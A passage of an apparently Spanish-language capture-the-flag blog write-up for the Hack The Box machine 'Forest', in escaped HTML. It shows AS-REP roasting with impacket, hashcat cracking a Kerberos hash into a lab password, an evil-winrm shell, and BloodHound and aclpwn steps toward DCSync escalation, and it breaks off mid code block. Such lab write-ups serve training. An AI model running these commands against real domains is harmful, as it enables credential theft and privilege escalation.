+sebastien
+lucinda
+svc-alfresco
+andy
+mark
+santi
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Ejecucion de script de impacket:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@kali:~/impacket/examples# python GetNPUsers.py HTB/ -usersfile users -format hashcat -outputfile hashes.asreproast -dc-ip 10.10.10.161
+Impacket v0.9.19 - Copyright &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; SecureAuth Corporation
+
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; User Administrator doesn&lt;span class=&#34;s1&#34;&gt;&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[-] User HealthMailboxc3d7722 doesn&amp;#39;&lt;/span&gt;t have UF_DONT_REQUIRE_PREAUTH &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; User HealthMailboxfc9daad doesn&lt;span class=&#34;s1&#34;&gt;&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[-] User HealthMailboxc0a90c9 doesn&amp;#39;&lt;/span&gt;t have UF_DONT_REQUIRE_PREAUTH &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; User HealthMailbox670628e doesn&lt;span class=&#34;s1&#34;&gt;&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[-] User HealthMailbox968e74d doesn&amp;#39;&lt;/span&gt;t have UF_DONT_REQUIRE_PREAUTH &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; User HealthMailbox6ded678 doesn&lt;span class=&#34;s1&#34;&gt;&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[-] User HealthMailbox83d6781 doesn&amp;#39;&lt;/span&gt;t have UF_DONT_REQUIRE_PREAUTH &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; User HealthMailboxfd87238 doesn&lt;span class=&#34;s1&#34;&gt;&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[-] User HealthMailboxb01ac64 doesn&amp;#39;&lt;/span&gt;t have UF_DONT_REQUIRE_PREAUTH &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; User HealthMailbox7108a4e doesn&lt;span class=&#34;s1&#34;&gt;&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[-] User HealthMailbox0659cc1 doesn&amp;#39;&lt;/span&gt;t have UF_DONT_REQUIRE_PREAUTH &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; User sebastien doesn&lt;span class=&#34;s1&#34;&gt;&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[-] User lucinda doesn&amp;#39;&lt;/span&gt;t have UF_DONT_REQUIRE_PREAUTH &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; User andy doesn&lt;span class=&#34;s1&#34;&gt;&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[-] User mark doesn&amp;#39;&lt;/span&gt;t have UF_DONT_REQUIRE_PREAUTH &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; User santi doesn&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;t have UF_DONT_REQUIRE_PREAUTH &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Dentro del archivo de hashes.asreproast encontramos el hash de uno de los usuarios.&lt;/p&gt;
+&lt;h3 id=&#34;hashcat---kerberos&#34;&gt;HASHCAT - KERBEROs&lt;/h3&gt;
+&lt;p&gt;Utilizamos hashcat para crackear el hash que obtuvimos con el script de impacket.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sckull@uplifted:~/tools/hashcat$ ./hashcat64.bin -m &lt;span class=&#34;m&#34;&gt;18200&lt;/span&gt; pass_forest -o cracked.txt ../rockyou.txt --force  
+hashcat &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;v5.1.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; starting...
+
+nvmlDeviceGetFanSpeed&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;: Not Supported
+
+OpenCL Platform &lt;span class=&#34;c1&#34;&gt;#1: NVIDIA Corporation&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;======================================&lt;/span&gt;
+* Device &lt;span class=&#34;c1&#34;&gt;#1: GeForce MX130, 501/2004 MB allocatable, 3MCU&lt;/span&gt;
+
+Hashes: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; digests&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; unique digests, &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; unique salts
+Bitmaps: &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt; bits, &lt;span class=&#34;m&#34;&gt;65536&lt;/span&gt; entries, 0x0000ffff mask, &lt;span class=&#34;m&#34;&gt;262144&lt;/span&gt; bytes, 5/13 rotates
+Rules: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
+
+Applicable optimizers:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+
+Minimum password length supported by kernel: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
+Maximum password length supported by kernel: &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt;
+
+ATTENTION! Pure &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;unoptimized&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; OpenCL kernels selected.
+This enables cracking passwords and salts &amp;gt; length &lt;span class=&#34;m&#34;&gt;32&lt;/span&gt; but &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; the price of drastically reduced performance.
+If you want to switch to optimized OpenCL kernels, append -O to your commandline.
+
+Watchdog: Temperature abort trigger &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; to 90c
+
+Dictionary cache built:
+* Filename..: ../rockyou.txt
+* Passwords.: &lt;span class=&#34;m&#34;&gt;14344392&lt;/span&gt;
+* Bytes.....: &lt;span class=&#34;m&#34;&gt;139921507&lt;/span&gt;
+* Keyspace..: &lt;span class=&#34;m&#34;&gt;14344385&lt;/span&gt;
+* Runtime...: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; sec
+
+                                                 
+Session..........: hashcat
+Status...........: Cracked
+Hash.Type........: Kerberos &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; AS-REP etype &lt;span class=&#34;m&#34;&gt;23&lt;/span&gt;
+Hash.Target......: &lt;span class=&#34;nv&#34;&gt;$krb5asrep$23$svc&lt;/span&gt;-alfresco@HTB:2f985636440000c102e7...6864af
+Time.Started.....: Fri Nov  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; 02:46:04 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; secs&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+Time.Estimated...: Fri Nov  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; 02:46:06 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; secs&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+Guess.Base.......: File &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;../rockyou.txt&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+Guess.Queue......: 1/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+Speed.#1.........:  2181.4 kH/s &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;9.63ms&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; @ Accel:256 Loops:1 Thr:64 Vec:1
+Recovered........: 1/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Digests, 1/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Salts
+Progress.........: 4128768/14344385 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;28.78%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+Rejected.........: 0/4128768 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+Restore.Point....: 4079616/14344385 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;28.44%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidates.#1....: s9039554h -&amp;gt; ruddsound1
+Hardware.Mon.#1..: Temp: 51c Util: 63% Core:1189MHz Mem:2505MHz Bus:4
+
+Started: Fri Nov  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; 02:45:56 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
+Stopped: Fri Nov  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; 02:46:07 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Pass:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$krb5asrep$23$svc&lt;/span&gt;-alfresco@HTB:2f985636440000c102e7a67d333b3d24&lt;span class=&#34;nv&#34;&gt;$7&lt;/span&gt;b3a05d397f5ea656b6649ef36dfe3b0c9c5be004550dc64da438b19c056b1caf1c1408ad8840c7cb507c5ca040ad1abf3ceea9d68e13f82fb0d18df542343004c4ec202ae4b9b818457cde2a1ffe74bd8cf0bee3795e74fd1410946c1ae5323e00b3cfceda7f26e053eb6c2e3922dce1095812a6071aeee4a000442ae3f86f3676119df60fdf61bb4f287e3317128664557f0fa6f3b745b5f122afa5612b0c8fc398b2869e97240a81dda272f4ff802914b6c7c59cc80fd5e357097dd2848d66b5f346cf6bfe8de21bf5ba0ef2646c559be47ce0af236c2ce1e45afaf6864af:s3rvice
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;smbmap&#34;&gt;SMBMAP&lt;/h3&gt;
+&lt;p&gt;Utilizamos las credenciales del usuario svc-alfresco para ver en que SHARENAMES tenemos acceso en el puerto de samba.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/forest/Screenshot_20191105_001300.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Confirmamos que solo tenemos acceso a NETLOGON y SYSVOL con psexec.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/forest/Screenshot_20191105_002021.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;user-svc-alfresco&#34;&gt;User svc-alfresco&lt;/h2&gt;
+&lt;p&gt;En el reporte del escaneo de nmap vemos un puerto en el que podemos utilizar las credenciales para poder obtener una shell en el puerto de WINRM, utilizamos EVILRM.&lt;/p&gt;
+&lt;p&gt;Evil-RM: &lt;a href=&#34;https://github.com/Hackplayers/evil-winrm&#34;&gt;https://github.com/Hackplayers/evil-winrm&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Install: &lt;code&gt;gem install evil-winrm&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/forest/Screenshot_20191105_000802.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
+&lt;p&gt;Utilizamos &lt;code&gt;bloodhound.py&lt;/code&gt; para poder obtener la lista de usuarios, permisos de usuarios, grupos de usuarios e importar los datos en bloodhound para ver la ruta que podemos seguir para obtener permisos administrativos utilizando la informacion que nos proporciona bloodhound.&lt;/p&gt;
+&lt;h3 id=&#34;booldhoundpy&#34;&gt;Booldhound.py&lt;/h3&gt;
+&lt;p&gt;Utilizamos las credenciales del usuario svc-alfresco, el dominio y el namesever para obtener los datos.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/forest/Screenshot%20from%202019-11-29%2021.13.16.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Comprimimos los archivos en zip.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/forest/Screenshot%20from%202019-11-29%2021.15.35.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;bloodhound&#34;&gt;Bloodhound&lt;/h3&gt;
+&lt;p&gt;Importamos los datos que obtuvimos a bloodhound. Nos mostrará un mapa con todos los usuarios disponibles y los grupos de usuarios a los que pertenecen, con los distintos permisos que cada uno tiene, incluso, los permisos que tienen uno sobre otro.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/forest/Screenshot%20from%202019-11-29%2021.16.10.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Nos ubicamos en el usuario actual (svc-alfresco) y vemos informacion del usuario, lo que nos interesa es &lt;code&gt;Recehable High Values&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/forest/Screenshot%20from%202019-11-29%2021.20.58.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Podemos ver que el usuario es miembro de varios grupos, y tiene permisos de &lt;strong&gt;WriteDACL&lt;/strong&gt;, que le permiten al usuario modificar permisos de dominio en este caso &lt;strong&gt;htb.local&lt;/strong&gt; y realizar operaciones en &lt;strong&gt;DCSync&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/forest/Screenshot%20from%202019-11-29%2021.29.36.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Bloodhound nos proporciona cierta informacion que puede ser de utilidad para realizar estas operaciones, para ello nos ubicamos en &lt;code&gt;Writedacl &amp;gt; Help &amp;gt; Abuse Info&lt;/code&gt;.&lt;/p&gt;
+&lt;h3 id=&#34;aclpwn&#34;&gt;ACLPWN&lt;/h3&gt;
+&lt;p&gt;Podemos hacerlo de forma automatizada utilizando esta herramienta, aclpwn permite encontrar y explotar una ruta para obtener privilegios administrativos utilizando los datos obtenidos de bloodhound desde la base de datos.&lt;/p&gt;
+&lt;p&gt;Realizamos una busqueda del camino mas cercano:&lt;/p&gt;
+&lt;p&gt;Los parametros:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;-f usuario/computadora &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Es el nodo de inicio&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+-ft user &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Especificamos que el nodo inicial es usuario/computadora/dominio/grupo&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+-t htb.local &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;El destino al cual deseamos llegar&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+-tt domain &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Especificamos que el destino es usuario/computadora/dominio/grupo&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+-d htb.local &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;El Dominio&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+-du neo4j &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Usuario para la base de datos&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+-dp toor &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Contraseña para la base de datos&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+-dry &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Especificamos que no deseamos atacar&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Podemos ver que encontro un camino y puede ser explotado.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
